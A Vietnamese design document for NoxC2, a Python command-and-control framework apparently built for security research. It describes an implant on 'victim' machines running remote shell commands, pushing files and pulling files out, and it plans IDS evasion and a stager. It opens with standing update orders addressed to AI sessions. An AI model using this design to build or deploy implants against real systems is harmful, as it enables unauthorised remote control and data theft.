# NoxC2 — Ngữ Cảnh Toàn Bộ Project

> Tài liệu này mô tả đầy đủ kiến trúc, codebase và luồng hoạt động của NoxC2 dành cho AI.  
> Không cần đọc source thêm — mọi thông tin cần thiết đều có ở đây.

## ⚠️ NGUYÊN TẮC CẬP NHẬT

**MỌI THAY ĐỔI VỀ KIẾN TRÚC, FILE, API, HOẶC TÍNH NĂNG PHẢI ĐƯỢC GHI LẠI VÀO FILE NÀY NGAY LẬP TỨC.**

Không có ngoại lệ. Mọi thay đổi đều phải được document:

- Thêm file mới → cập nhật Section 3 (Cấu trúc thư mục)
- Thay đổi kiến trúc → cập nhật Section 4 (Kiến trúc tổng thể)
- Thêm/sửa API endpoint → cập nhật section tương ứng
- Thêm command → cập nhật Section 7 (Hệ thống Command)
- Thêm dependency → cập nhật Section 2 (Công nghệ & Thư viện)
- Thay đổi protocol/message format → cập nhật section tương ứng
- Hoàn thành tính năng → di chuyển từ "Chưa có" sang "Đã xong" trong Section 15
- Refactor code → ghi lại lý do và những gì thay đổi
- Sửa bug quan trọng → document root cause và fix
- Thay đổi config/constant → cập nhật Section 14

**Mục đích:** Để AI session tiếp theo có thể hiểu đầy đủ bối cảnh mà không cần đọc lại toàn bộ source code.

**Format cập nhật:**
- Đánh dấu ngày thay đổi ở cuối section (VD: `*Cập nhật: 2026-10-01*`)
- Giữ lịch sử thay đổi quan trọng, không xoá thông tin cũ nếu nó vẫn cần thiết để hiểu ngữ cảnh

---

## 1. Tổng Quan

**NoxC2** là một **Command & Control (C2) framework thu nhỏ**, viết bằng **Python**, được phát triển hoàn toàn vì mục đích **học thuật và nghiên cứu bảo mật**.

- **Ngôn ngữ:** Python (pure Python, không dùng C/Go/Rust)
- **Phiên bản:** v0.1.0 (đang phát triển)
- **Repo GitHub:** `https://github.com/Carax49/NoxC2`
- **Trạng thái:** In development
- **Branch chính:** `main`; branch đang làm việc: `sim`

---

## 2. Công Nghệ & Thư Viện

| Thư viện | Phiên bản | Vai trò |
|---|---|---|
| `Flask` | 3.1.3 | HTTP server cho transport lớp & Web API |
| `Werkzeug` | 3.1.8 | WSGI server (`make_server`) |
| `rich` | 15.0.0 | Terminal UI đẹp (màu, bảng, markup) |

**Agent (phía victim):** Dùng **100% Python Standard Library (Pure Python Stdlib)** — `urllib.request`, `json`, `socket`, `platform`, `getpass`, `uuid`, `subprocess`, `base64`, `os`, `time`, `ssl` — **tuyệt đối không cài thêm bất kỳ thư viện bên ngoài nào** (Zero-Dependency).

---

## 3. Cấu Trúc Thư Mục

```
NoxC2/
├── .AI/
│   ├── agent.md              ← file này (ngữ cảnh toàn bộ project)
│   ├── advance.md            ← lộ trình nâng cao & định hướng HTTPS / TLS
│   └── note.txt              ← ghi chú phân tích & thử nghiệm
├── src/
│   ├── agent/
│   │   ├── test.py           ← Agent (implant) chạy phía victim (Pure Python Stdlib)
│   │   ├── upload_handler.py ← Xử lý nhận file upload tại agent
│   │   └── download_handler.py ← Xử lý gửi file download từ agent về server
│   └── server/
│       ├── main.py           ← Entry point server
│       ├── config/
│       │   ├── __init__.py   ← Re-export tất cả config
│       │   ├── config.py     ← Hằng số cấu hình (HOST, PORT, HTTP_PORT, BUFFER_SIZE, TIMEOUT, DB_PATH, MessageType)
│       │   └── banner.py     ← ASCII art banner + thông tin khởi động
│       ├── db/
│       │   ├── __init__.py   ← Database Singleton & WAL Connection Context Manager
│       │   ├── schema.py     ← DDL scripts & init_db() tạo bảng / indexes
│       │   └── repository.py ← Repositories: AgentRepo, TaskRepo, TransferRepo, LogRepo
│       ├── core/
│       │   ├── server.py     ← Class Server — orchestrator chính, xử lý kết quả & file download
│       │   ├── client_manager.py ← ClientInfo + ClientManager (singleton Manager)
│       │   └── client_session.py ← ClientSession — quản lý giao tiếp với 1 agent
│       ├── transport/
│       │   ├── base.py       ← Abstract BaseTransport
│       │   ├── http_transport.py ← HTTPTransport (Flask + Werkzeug threaded)
│       │   └── api.py        ← Web API routes & SSE streaming cho Web Dashboard
│       ├── serializer/
│       │   ├── base.py       ← Abstract SerializerBase
│       │   └── json.py       ← JSONSerializer (encode/decode JSON ↔ bytes)
│       ├── frontend/
│       │   ├── index.html    ← Semantic HTML Dashboard SPA
│       │   ├── css/
│       │   │   ├── variables.css   ← Theme tokens (Dark / Light mode)
│       │   │   ├── base.css        ← Reset, layout grid, typography
│       │   │   ├── components.css  ← Buttons, tables, tags, toasts, inputs
│       │   │   └── panels.css      ← Header, Sidebar, Tab Panels, Log strip
│       │   └── js/
│       │       ├── theme.js  ← Quản lý Dark/Light mode & localStorage
│       │       ├── state.js  ← State tập trung (clients, selection)
│       │       ├── ui.js     ← Render DOM, tables, toasts, logs
│       │       ├── api.js    ← REST API calls & SSE event listener
│       │       └── app.js    ← App entry, tabs, event handlers
│       └── commands/
│           ├── base.py       ← Abstract Command (name, description, group, execute)
│           ├── registry.py   ← GENERAL_COMMANDS, HOST_COMMANDS, AGENT_COMMANDS dicts + @register
│           ├── help.py       ← Command `help` / `help <cmd>`
│           ├── interact/
│           │   └── shell.py  ← Class Shell + singleton ShellManager (REPL loop)
│           ├── hosts/
│           │   ├── show_clients.py   ← `client.show`
│           │   ├── select_client.py  ← `client.select`
│           │   ├── drop_client.py    ← `client.drop`
│           │   └── remove_client.py  ← `client.remove`
│           └── agent/
│               ├── agent_commands.py ← Class `Exit` (gửi lệnh agent.exit)
│               ├── remote_shell.py   ← Command `shell <cmd>` (thực thi shell thật trên agent)
│               ├── file_upload.py    ← Command `agent.upload <local> <remote>`
│               └── file_download.py  ← Command `agent.download <remote> [local]`
├── requirements.txt
└── README.md
```

---

## 4. Kiến Trúc Tổng Thể

```
┌─────────────────────────────────────────────┐
│                  SERVER                     │
│                                             │
│  main.py                                    │
│    └── Server(HTTPTransport, JSONSerializer) │
│          │                                  │
│          ├── HTTPTransport (Flask + TLS)    │
│          │     Routes: /connect  POST       │
│          │             /message  POST       │
│          │             /command  GET        │
│          │             /api/*    REST API   │
│          │     SSLContext: certs/server.crt │
│          │                                  │
│          ├── Database (SQLite WAL Mode)     │
│          │     noxc2.db (agents, tasks,     │
│          │     task_results, transfers,     │
│          │     audit_logs)                  │
│          │                                  │
│          ├── ClientManager (singleton)      │
│          │     {uuid → ClientInfo}          │
│          │                                  │
│          ├── ClientSession (per agent)      │
│          │     quản lý send/recv request    │
│          │                                  │
│          └── ShellManager (REPL)            │
│                Command registry             │
└─────────────────────────────────────────────┘
                      ▲▼  HTTPS / TLS (port 8080)
┌─────────────────────────────────────────────┐
│                  AGENT                      │
│             src/agent/test.py               │
│                                             │
│   1. POST /connect  → đăng ký + nhận ACK   │
│   2. GET  /command  → long-poll lấy lệnh   │
│   3. POST /message  → gửi kết quả về       │
│   (100% Pure Python stdlib + ssl context)   │
└─────────────────────────────────────────────┘
```

**Mô hình:**  
- Server là **operator console** (giao diện CLI Terminal + Web Dashboard).  
- Agent là **implant** chạy trên máy victim (100% Pure Python stdlib, Zero-Dependency).  
- Giao tiếp dữ liệu dạng **JSON qua HTTPS / TLS REST** (mặc định `https://127.0.0.1:8080`).  
- **Bảo mật đường truyền:** Đã kích hoạt **HTTPS / TLS Transport Security** với mã hoá toàn bộ traffic (URL, Headers, Token, Payloads) mà không cần bất kỳ 3rd-party library nào trên máy victim.

---

## 5. Luồng Hoạt Động Chi Tiết

### 5.1. Khởi động Server

```
python3 main.py
  → Server(HTTPTransport(), JSONSerializer())
  → server.start()
     → in banner ASCII art (ngẫu nhiên 1 trong 5 banner)
     → HTTPTransport.start()  → Flask listen 127.0.0.1:8080
     → ShellManager.run()     → REPL loop (blocking)
```

### 5.2. Agent kết nối lần đầu

```
Agent                                          Server
  │                                              │
  │── POST /connect ─────────────────────────→  │
  │   Header: X-UUID: <agent_uuid>              │
  │   Body: JSON({type:"register",              │
  │          data:{uuid,hostname,username,       │
  │                os,os_version,arch}})         │
  │                                              │
  │                          handle_client()    │
  │                          → ClientSession.receive_response()
  │                          → parse JSON
  │                          → Manager.add_client(uuid, ...)
  │                          → ClientSession.send_request(ACK)
  │                                              │
  │←── 200 JSON({type:"ack", data:"ACK"}) ──────│
  │                                              │
```

### 5.3. Operator gửi lệnh shell

```
Operator gõ: shell whoami
  → ShellManager.handle_command("shell whoami")
  → AGENT_COMMANDS["shell"].execute("whoami")
  → với mỗi cid trong ShellManager.get_current_client():
       ClientSession.send_request(COMMAND, "whoami")
       → HTTPTransport.send(cid, data)
          → __send_queues[cid].put(data)

Agent đang long-poll GET /command (timeout 60s):
  → __send_queues[cid].get(timeout=50)
  → trả 200 với JSON task

Agent nhận lệnh:
  → handle_task(task)
  → run_command("whoami") → run_shell("whoami") → subprocess.run()
  → POST /message với kết quả

Server nhận /message:
  → __recv_queues[cid].put(data)
  → handle_client(uuid, addr) được gọi
  → print kết quả ra console: "From <ip>: <output>" & broadcast tới Web Dashboard
```

### 5.4. File Upload (Server → Agent)

```
Operator gõ: agent.upload /local/file.txt /tmp/file.txt
  → FileUpload.execute("/local/file.txt", "/tmp/file.txt")
  → đọc file, base64 encode
  → ClientSession.send_request(COMMAND, {
        command: "agent.upload",
        file_path: "/tmp/file.txt",
        file_data: "<base64>",
        file_size: <int>
    })

Agent nhận:
  → run_command(dict) → handle_upload_file(file_path, file_data, file_size)
  → decode base64 → verify size → atomic write (tmp → rename)
  → trả {status:"success",...}
```

### 5.5. File Download (Agent → Server)

```
Operator gõ: agent.download /remote/file.txt [/local/file.txt]
  → FileDownload.execute("/remote/file.txt", ...)
  → ClientSession.send_request(COMMAND, {
        command: "agent.download",
        remote_path: "/remote/file.txt"
    })

Agent nhận:
  → run_command(dict) → handle_download_file(remote_path)
  → đọc file trên agent → base64 encode
  → trả {status:"success", file_name, file_size, file_data:"<base64>", file_path}

Server nhận:
  → Server.handle_file_download() → decode base64 → ghi file vào `downloads/<uuid>/<filename>`
```

### 5.6. Thoát

```
Operator gõ: exit
  → Server.stop() → hỏi xác nhận (y/n)
  → y → Exit.execute(*selected_cids) → gửi lệnh "agent.exit" tới mỗi agent
  → Manager.drop_all_clients()
  → HTTPTransport.stop() → Flask shutdown
```

---

## 6. Bảo Mật Đường Truyền & Transport Security (HTTPS / TLS)

### 6.1. Nguyên Tắc "Pure Python / Zero-Dependency"
Trước đây hệ thống từng thử nghiệm tự mã hoá tầng ứng dụng (Custom AES-256-GCM qua thư viện `cryptography`). Tuy nhiên phương án này đã được **loại bỏ hoàn toàn** vì:
- **Tránh mất tính Zero-Dependency của Agent:** `cryptography` sử dụng C-extension (`hazmat`), bắt buộc máy nạn nhân (victim) phải cài đặt qua pip thì mới chạy được.
- **Loại bỏ coupling & `sys.path` hack:** Không chia sẻ code/file trực tiếp giữa server và agent.

### 6.2. Cơ Chế HTTPS / TLS Đã Triển Khai (Hoàn thành 2026-10-06)
NoxC2 bảo mật toàn bộ giao tiếp mạng qua **HTTPS / TLS tiêu chuẩn**:
- **Server:** Nạp SSL Context (`ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)`) cho Werkzeug WSGI server với certificate/key. Nếu chưa có cert, Server tự động tạo self-signed certificate `certs/server.crt` & `certs/server.key` qua openssl.
- **Agent:** Sử dụng module `ssl` có sẵn trong Python stdlib (`ssl._create_unverified_context()`) kết hợp `urllib.request`.
- **Pre-Shared Key:** Hỗ trợ header `X-Agent-Key` xác thực Agent kết nối.
- **Lợi ích:** Đảm bảo 100% Pure Python (Zero-Dependency), mã hoá toàn diện (URL, Header, Body, Payloads, Files), chống sniffing và can thiệp traffic hiệu quả.

---

## 7. Hệ Thống Command

### Registry Pattern
```python
# registry.py
GENERAL_COMMANDS = {}   # help
HOST_COMMANDS    = {}   # client.*
AGENT_COMMANDS   = {}   # shell, agent.upload, agent.download

@register   # decorator tự đăng ký class vào dict tương ứng theo command.group
class SomeCommand(Command):
    name = "cmd.name"
    group = "host"  # hoặc "general" / "agent"
    def execute(self, *args): ...
    def get_help(self) -> str: ...
```

### Tất Cả Commands Hiện Có

#### GENERAL (nhóm chung)
| Command | File | Mô tả |
|---|---|---|
| `help` | `commands/help.py` | Hiển thị help menu |
| `help <cmd>` | `commands/help.py` | Help chi tiết cho 1 command |
| `clear` | built-in shell | Xoá màn hình |
| `exit` | built-in shell | Thoát server |

#### HOST (quản lý agents kết nối)
| Command | File | Mô tả |
|---|---|---|
| `client.show` / `client.show -a` | `hosts/show_clients.py` | Hiện bảng tất cả agents |
| `client.show <id>` | `hosts/show_clients.py` | Chi tiết 1 agent cụ thể |
| `client.select <id>` | `hosts/select_client.py` | Chọn agent để tương tác |
| `client.select -a` | `hosts/select_client.py` | Chọn tất cả agents |
| `client.select --add <id>` | `hosts/select_client.py` | Thêm vào selection hiện tại |
| `client.select -ls` | `hosts/select_client.py` | Liệt kê agents đang chọn |
| `client.drop -a` / `<id>` | `hosts/drop_client.py` | Bỏ chọn agent (không disconnect) |
| `client.remove -a` / `<id>` | `hosts/remove_client.py` | Disconnect + xoá agent khỏi danh sách |

#### AGENT (lệnh gửi tới agent đang chọn)
| Command | File | Mô tả |
|---|---|---|
| `shell <command>` | `agent/remote_shell.py` | Gửi lệnh shell thật (`subprocess.run`) tới tất cả selected agents |
| `agent.upload <local> <remote>` | `agent/file_upload.py` | Upload file từ server → agent |
| `agent.download <remote> [local]` | `agent/file_download.py` | Download file từ agent → server (lưu vào `downloads/<uuid>/`) |

---

## 8. Protocol HTTPS / TLS

**Server listen:** `https://127.0.0.1:8080` (Flask + Werkzeug threaded mode with SSLContext)

| Route | Method | Mục đích |
|---|---|---|
| `/connect` | POST | Agent đăng ký lần đầu, server nhận info hệ thống |
| `/command` | GET | Agent long-poll lấy lệnh (timeout 50s phía server, 60s phía agent) |
| `/message` | POST | Agent gửi kết quả lệnh về server |

**Header bắt buộc trên mọi request:** 
- `X-UUID: <agent_uuid>`
- `X-Agent-Key: <token>` (nếu server cấu hình `NOX_AGENT_KEY`)

**Content-Type của body:** `application/octet-stream` (bytes của JSON payload)

---

## 9. Message Format

Mọi message (server → agent và agent → server) đều có cùng cấu trúc JSON:

```json
{
  "type": "register" | "ack" | "command" | "result",
  "uuid": "<agent_uuid>",
  "message_id": "<uuid> - <int>",
  "timestamp": 1234567890,
  "data": "<payload>"
}
```

- **register:** agent gửi thông tin hệ thống lúc kết nối
- **ack:** server xác nhận đăng ký thành công  
- **command:** server gửi lệnh tới agent (data là string hoặc dict)
- **result:** agent gửi kết quả về (data là output của lệnh)

---

## 10. Queue-based Communication

`HTTPTransport` dùng **2 dict of queues** để đồng bộ giữa Flask thread và Server thread:

```python
__send_queues = {}  # {uuid: Queue}  — server → agent
__recv_queues = {}  # {uuid: Queue}  — agent → server
```

- Khi Flask nhận POST `/connect` hoặc `/message`: data được put vào `__recv_queues[uuid]`
- Khi Flask xử lý GET `/command`: block-wait trên `__send_queues[uuid]` (timeout 50s)
- Khi `ClientSession.send_request()`: put vào `__send_queues[uuid]`
- Khi `ClientSession.receive_response()`: block-wait trên `__recv_queues[uuid]`

Đây là cơ chế **synchronous request-response** được implement qua async HTTP + queues.

---

## 11. Quản Lý Agent (ClientManager)

**Singleton:** `Manager = ClientManager()` (module-level instance)

```python
class ClientInfo:
    uuid, hostname, username, addr, os, arch, session, last_beacon

class ClientManager:
    __clients_list: dict[uuid, ClientInfo]
    __lock: threading.Lock  # thread-safe

    add_client(uuid, hostname, username, address, os, arch, session)
    get_client(uuid) -> ClientInfo
    get_client_list() -> dict
    drop_client(uuid)        # xoá khỏi dict
    drop_all_clients()
    count_client() -> int
    check_valid_cid(cid) -> bool
```

---

## 12. Shell REPL

**Singleton:** `ShellManager = Shell()` (module-level instance)

```python
class Shell:
    __current_client: set  # set of uuid đang được chọn
    __running: bool
    __exit_handler: callable

    prompt()     # "[NoxC2]> " hoặc "[N agent(s)]> "
    run()        # REPL loop blocking
    add(cid)     # thêm agent vào selection
    remove(cid)  # bỏ agent khỏi selection
    remove_all()
    get_current_client() -> set
```

**Built-in commands** (xử lý trực tiếp trong `run()`):
- `exit` → gọi `__exit_handler` (Server.stop)
- `clear` → `cls` (Windows) / `clear` (Unix)

**Các commands khác** → `Shell.handle_command()` → tra GROUPS dict → gọi `.execute(*args)`

---

## 13. Agent Implant (test.py)

Agent được thiết kế theo tiêu chuẩn **100% Pure Python Standard Library** (Zero-Dependency), chạy trực tiếp trên máy mục tiêu:

```python
AGENT_ID = str(uuid.uuid4())  # random UUID mỗi lần chạy
SERVER_URL = "http://127.0.0.1:8080"
RECONNECT_DELAY = 3  # giây
```

**Vòng lặp chính:**
```
register() → nhận ACK
  └─ loop:
       get_command()        # GET /command, timeout 60s
       handle_task(task)
         ├─ run_command(str)   # thực thi qua run_shell (subprocess.run)
         └─ run_command(dict)  # cho dict commands (agent.upload, agent.download)
       send_result()
```

**Các lệnh và tác vụ Agent xử lý:**
- **Thực thi shell thật (`run_shell`):** Tận dụng `subprocess.run(shell=True, capture_output=True, text=True, timeout=30)` kế thừa biến môi trường OS, trả về cả stdout và stderr.
- `agent.upload` (dict format) → nhận, giải mã Base64 và ghi file an toàn (qua `upload_handler.py`).
- `agent.download` (dict format) → đọc file từ victim, mã hoá Base64 và gửi về server (qua `download_handler.py`).
- `agent.exit` → ngắt vòng lặp và kết thúc tiến trình sạch sẽ (`os._exit(0)`).

---

## 14. Cấu Hình (config.py & .env)

```python
HOST             = "127.0.0.1"
PORT             = 4926          # chưa dùng (placeholder cho TCP transport tương lai)
HTTP_PORT        = 8080          # Flask listen
BUFFER_SIZE      = 4926          # byte (chưa dùng trực tiếp)
TIMEOUT          = 5             # giây (chưa dùng trực tiếp)
MAX_WAITING_CLIENT = 10
MAX_RETRIES      = 5

# Security & Keys
SECRET_KEY       = os.getenv("NOX_SECRET_KEY") or secrets.token_hex(32)
AGENT_KEY        = os.getenv("NOX_AGENT_KEY", "")

# Database Configuration (SQLite)
DB_PATH          = os.getenv("NOX_DB_PATH") or "noxc2.db"

# HTTPS / TLS Transport
USE_HTTPS        = os.getenv("NOX_USE_HTTPS", "true").lower() in ("true", "1", "yes")
SSL_CERT_PATH    = os.getenv("NOX_SSL_CERT") or "certs/server.crt"
SSL_KEY_PATH     = os.getenv("NOX_SSL_KEY") or "certs/server.key"
# ensure_ssl_certificates(): tự động sinh certs/server.crt & certs/server.key bằng openssl nếu chưa có
```

**MessageType class (constants):**
```python
REGISTER = "register"
ACK      = "ack"
COMMAND  = "command"
RESULT   = "result"
```

---

## 15. Tính Năng Đã Hoàn Thành vs. Cần Phát Triển

### ✅ Đã xong
- Persistence & SQLite Database (Lưu trữ bền vững agents, tasks, kết quả lệnh, lịch sử file transfer, audit logs với SQLite WAL mode)
- HTTPS / TLS Transport Security (Mã hoá toàn bộ traffic sử dụng stdlib `ssl` + auto self-signed cert generation)
- Pre-Shared Key Agent Authentication (`X-Agent-Key`)
- HTTP / HTTPS Transport (Flask + Werkzeug threaded WSGI)
- Web API & SSE Real-time Logs cho Web Dashboard (`src/server/transport/api.py`)
- Web Dashboard UI (`src/server/frontend/index.html`)
- Pure Python Stdlib Implant (100% Zero-Dependency phía victim)
- Multi-client support (quản lý nhiều agent đồng thời)
- Client session management (thread-safe queues)
- Interactive shell REPL với Rich UI đẹp mắt
- Command registry (decorator-based auto-register `@register`)
- Real Remote Shell Execution (`shell <cmd>` qua `subprocess.run` kèm timeout)
- File upload server → agent (`agent.upload`)
- File download agent → server (`agent.download` lưu vào `downloads/<uuid>/`)
- Graceful shutdown (`exit` → xác nhận → gửi tín hiệu `agent.exit` ngắt toàn bộ agents)
- Last beacon & disconnect tracking

### 🔲 Chưa có / Cần phát triển (Tham khảo `.AI/advance.md`)
- **Stateful Directory** (`agent.cd` / `agent.pwd` duy trì thư mục hiện tại)
- **Single-File Agent Builder / Stager** (Tự động bundle agent thành 1 file .py duy nhất hoặc standalone payload)
- **Screenshot capture** (Chụp ảnh màn hình không phụ thuộc thư viện ngoài)
- **Process management** (`ps.list`, `ps.kill`)
- **System inspection** (Mạng, routing, arp qua lệnh native)
- **Chunked file streaming** (Truyền file dung lượng lớn chia nhỏ chunks)
- **Agent Jitter & Sleep configuration** (Tăng tính ẩn mình trước IDS/IPS)

---

## 16. Cách Chạy

```bash
# Clone và cài dependencies
git clone https://github.com/Carax49/NoxC2.git
cd NoxC2
python3 -m venv venv
# Windows:
.venv\Scripts\activate
# Linux/Mac:
source venv/bin/activate
pip install -r requirements.txt

# Chạy server
cd src/server
python3 main.py

# Chạy agent (terminal khác)
cd src/agent
python3 test.py
```

**Workflow cơ bản:**
```
client.show -a          # xem agents đang kết nối
client.select <id>      # chọn agent
shell whoami            # gửi lệnh
client.drop -a          # bỏ chọn
exit                    # thoát server
```

---

## 17. Thiết Kế Patterns

| Pattern | Ứng dụng ở đâu |
|---|---|
| **Abstract Base Class** | `BaseTransport`, `SerializerBase`, `Command` |
| **Singleton** | `Manager` (ClientManager), `ShellManager` (Shell) |
| **Decorator** | `@register` tự đăng ký command vào registry dict |
| **Queue-based sync** | `HTTPTransport` đồng bộ Flask threads ↔ Server logic |
| **Dependency Injection** | `Server(transport, serializer)` — dễ swap transport/serializer |
| **Observer** | `set_on_client(handler)` — callback khi agent kết nối |
| **Strategy** | Transport và Serializer là strategies có thể thay thế |

---

## 18. IDE & Tooling

- **IDE:** JetBrains (có `.idea/`) — project tên `C2_Research`
- **Git branches:** `main` (production), `sim` (đang dev)
- **OS development:** Windows 11 Pro (nhưng code cross-platform)
- **Python version:** 3.14 (dựa vào `__pycache__` bytecode `cpython-314`)

---

## 19. Web Frontend & REST API (thêm 2026-10-01)

### Tổng quan

Một **web dashboard** đã được tích hợp vào server, không cần server riêng.
Truy cập qua `http://127.0.0.1:8080/` sau khi server đã start.

---

### 19.1. Các File Mới / Sửa Đổi

| File | Loại | Mô tả |
|---|---|---|
| `src/server/transport/api.py` | NEW | Flask Blueprint chứa toàn bộ REST API `/api/*` và serve frontend |
| `src/server/frontend/index.html` | NEW | Single-page HTML dashboard (dark terminal aesthetic) |
| `src/server/transport/http_transport.py` | MODIFIED | Gọi `self.__register_api()` trong `__init__` để mount Blueprint |
| `src/server/core/server.py` | MODIFIED | Gọi `broadcast_log` / `broadcast_client_update` sau mỗi sự kiện agent |

---

### 19.2. REST API Routes (`src/server/transport/api.py`)

#### Blueprint: `create_api_blueprint()`
Được mount vào Flask app của `HTTPTransport` qua `self.__app.register_blueprint(blueprint)`.

Frontend directory: `src/server/frontend/` (served tại `/`).

```
GET  /                        → serve index.html (frontend SPA)
```

#### Clients

```
GET  /api/clients             → danh sách tất cả agents
     Response: { clients: [{uuid, hostname, username, ip, port, os, arch, last_beacon, selected}], total }

GET  /api/clients/selected    → danh sách uuid đang chọn
     Response: { selected: [uuid, ...] }

POST /api/clients/select      → chọn agents
     Body: { cids?: string[], all?: bool, add?: bool }
       - add=true: giữ selection cũ, thêm vào
       - all=true: chọn tất cả (bỏ qua cids)
     Response: { ok, selected, unknown? }

POST /api/clients/drop        → bỏ chọn (không disconnect)
     Body: { cids?: string[] } hoặc { all: true }
     Response: { ok, selected }

POST /api/clients/remove      → disconnect + xoá agent
     Body: { cids?: string[] } hoặc { all: true }
     Response: { ok, removed, unknown }
```

#### Shell

```
POST /api/shell               → gửi shell command tới all selected agents
     Body: { command: string }
     Response: { ok, sent: [uuid,...], missing: [uuid,...] }
     Lỗi 400: command rỗng
     Lỗi 400: chưa select agent nào
```

#### File Upload

```
POST /api/upload              → upload file tới all selected agents (multipart/form-data)
     Form fields:
       file        — file object
       remote_path — đường dẫn đích trên agent (string)
     Response: { ok, sent, missing, filename, size }
     Lỗi 400: thiếu file hoặc remote_path
     Lỗi 400: chưa select agent nào
```

#### Database & History Endpoints

```
GET  /api/history             → lấy lịch sử lệnh & kết quả (query: ?uuid=<id>&limit=50)
     Response: { ok: true, history: [{id, agent_uuid, command_type, command_payload, created_at, status, output, return_code, received_at}, ...], total }

GET  /api/transfers           → danh sách truyền file upload / download (query: ?uuid=<id>&limit=100)
     Response: { ok: true, transfers: [{id, agent_uuid, direction, remote_path, local_path, file_size, md5_hash, completed_at}, ...], total }

GET  /api/downloads/<uuid>/<file> → tải file nhị phân đã download từ server về trình duyệt
     Response: Binary file stream (attachment)

GET  /api/logs                → lấy lịch sử audit logs hệ thống từ CSDL (query: ?limit=100)
     Response: { ok: true, logs: [{id, level, message, created_at}, ...], total }
```

#### SSE Event Stream

```
GET  /api/events              → Server-Sent Events (text/event-stream)
     Events:
       event: log
         data: { level: "info"|"success"|"warn"|"error"|"cmd"|"result", message, ts }
       event: clients_update
         data: { ts }          ← trigger frontend fetch lại /api/clients
```

---

### 19.3. SSE Broadcast System

**Module-level functions** (trong `api.py`) để các module khác gọi:

```python
broadcast_log(level: str, message: str)
    # Gửi event "log" tới mọi trình duyệt đang kết nối
    # level: "info" | "success" | "warn" | "error" | "cmd" | "result"

broadcast_client_update()
    # Gửi event "clients_update" → frontend sẽ refresh danh sách agent
```

**Cơ chế:**
- Mỗi browser kết nối `/api/events` được cấp 1 `queue.Queue(maxsize=200)`.
- Queue được thêm vào list `_sse_subscribers` (thread-safe với `_sse_lock`).
- `_broadcast()` put payload vào mọi queue; queue full được tự dọn dẹp.
- Heartbeat mỗi 25s (`: heartbeat\n\n`) để giữ kết nối qua proxy/firewall.

**Tích hợp trong `server.py`:**
```python
# trong handle_client(), sau khi register thành công:
from transport.api import broadcast_log, broadcast_client_update
broadcast_log("success", f"Agent registered: {addr[0]}")
broadcast_client_update()

# khi nhận result từ agent:
broadcast_log("result", f"[{addr[0]}] {result_data}")
```
Tất cả `broadcast_*` calls được wrap trong `try/except Exception: pass` — không bao giờ crash server.

---

### 19.4. Frontend (`src/server/frontend/index.html`)

**Single-page HTML** — không dùng framework (vanilla JS, không build step).

**Layout:** CSS Grid 3-vùng
```
┌──────────header (48px)──────────┐
│                                 │
│  sidebar  │       main          │
│  (280px)  │   (tab content)     │
│           │                     │
├──────────log strip (200px)──────┤
```

**Sidebar:** Danh sách agent cards với checkbox selection. Buttons: Select all / Drop all.

**Main — 3 tabs:**
- **Shell**: Selection bar (số agent + UUID prefix) → input lệnh (Enter hoặc button Send) → quick-command chips (whoami, hostname, pwd, platform)
- **Upload**: Drag-and-drop zone + remote path field → POST multipart `/api/upload`
- **Agents**: Detail table với checkbox per-row + Remove button; bulk actions: Select all / Drop / Remove selected

**Log strip:** SSE-driven activity log
- Color coding: info (fg-1) / success (green) / warn (yellow) / error (red) / cmd (cyan) / result (purple)
- Max 300 dòng (auto-trim)
- Auto-scroll to bottom

**Theme:** Hỗ trợ Dual-Theme (Dark Mode & Light Mode) qua CSS Custom Properties:
- **Dark Mode (`:root`):** Giữ nguyên aesthetic Dark Terminal của NoxC2 (`#0b0d11`, `#111520`, `#181d2b`, accent `#00d4ff`).
- **Light Mode (`[data-theme="light"]`):** Giao diện sáng dịu mắt (`#f4f6fa`, `#ffffff`, `#e9edf5`, accent `#0084c7`).
- Tự động lưu lựa chọn vào `localStorage` và nạp sớm chống FOUC (Flash of Unstyled Content).

```
--bg-base:  #0b0d11 (dark) / #f4f6fa (light)  (nền chính)
--bg-panel: #111520 (dark) / #ffffff (light)  (sidebar, header, tab bar)
--bg-card:  #181d2b (dark) / #f8fafc (light)  (agent cards, tables)
--accent:   #00d4ff (dark) / #0084c7 (light)  (cyan / ocean blue — selection, buttons, focus)
--green:    #22d3a0 (dark) / #10b981 (light)  (success, IP tags)
--yellow:   #f5c842 (dark) / #d97706 (light)  (warn)
--red:      #ff4e6a (dark) / #ef4444 (light)  (error, danger)
--purple:   #a78bfa (dark) / #7c3aed (light)  (result output)
```

**Fonts:** JetBrains Mono (terminal/mono UI) + Inter (general UI), load từ Google Fonts.

**Connectivity indicator:** Chấm xanh/đỏ góc trên phải — xanh khi SSE connected, đỏ khi mất kết nối.
Auto-reconnect: `EventSource` tự reconnect sau 3s khi error.

**Fallback polling:** `setInterval(fetchClients, 10_000)` — refresh danh sách mỗi 10s dù SSE còn sống.

**Toast notifications:** Fixed bottom-right, tự dismiss sau 3.5s. `ok` (viền xanh) / `fail` (viền đỏ).

**Responsive:** Stack 1 cột khi ≤ 600px.

---

### 19.5. Cách HTTPTransport Mount Blueprint

```python
# http_transport.py — __init__
self.__register_api()   # gọi cuối trong __init__

def __register_api(self):
    """Gắn REST API Blueprint (/api/*) và frontend (/) vào Flask app."""
    from .api import create_api_blueprint
    blueprint = create_api_blueprint()
    self.__app.register_blueprint(blueprint)
```

Import lazy (`from .api import ...` bên trong function) để tránh circular imports.
Tương tự, trong `api.py`, mọi import của `Manager`, `ShellManager`, `Exit`, `upload_handler` đều nằm bên trong `create_api_blueprint()` (không phải module-level).

---

### 19.6. Cấu Trúc Thư Mục Frontend (Modular Architecture)

```
src/server/
├── frontend/
│   ├── index.html           ← HTML skeleton & layout
│   ├── css/
│   │   ├── variables.css    ← Design tokens, color palette, dark/light variables
│   │   ├── base.css         ← Global reset, typography, header, app layout
│   │   ├── components.css   ← Buttons, inputs, badges, tags, toasts, scrollbars
│   │   └── panels.css       ← Sidebar, shell panel, upload panel, agents table, log strip
│   └── js/
│       ├── theme.js         ← Dark/Light mode state, toggle & localStorage sync
│       ├── state.js         ← Global app state (clients, selected, activeTab, file)
│       ├── api.js           ← REST API helpers & SSE realtime stream connection
│       ├── ui.js            ← DOM rendering (agents list, table, badges, logs, toasts)
│       └── app.js           ← Tab navigation, shell/upload handlers, drag & drop, init
└── transport/
    ├── api.py               ← REST API Blueprint + SSE system + Static asset serving
    ├── base.py
    └── http_transport.py    ← Mount Blueprint trong __init__ (HTTPS/TLS)
```

---

### 19.7. Cập Nhật Mục 15 (Features)

#### ✅ Đã xong (bổ sung)
- Web dashboard (dark terminal aesthetic, không cần build step)
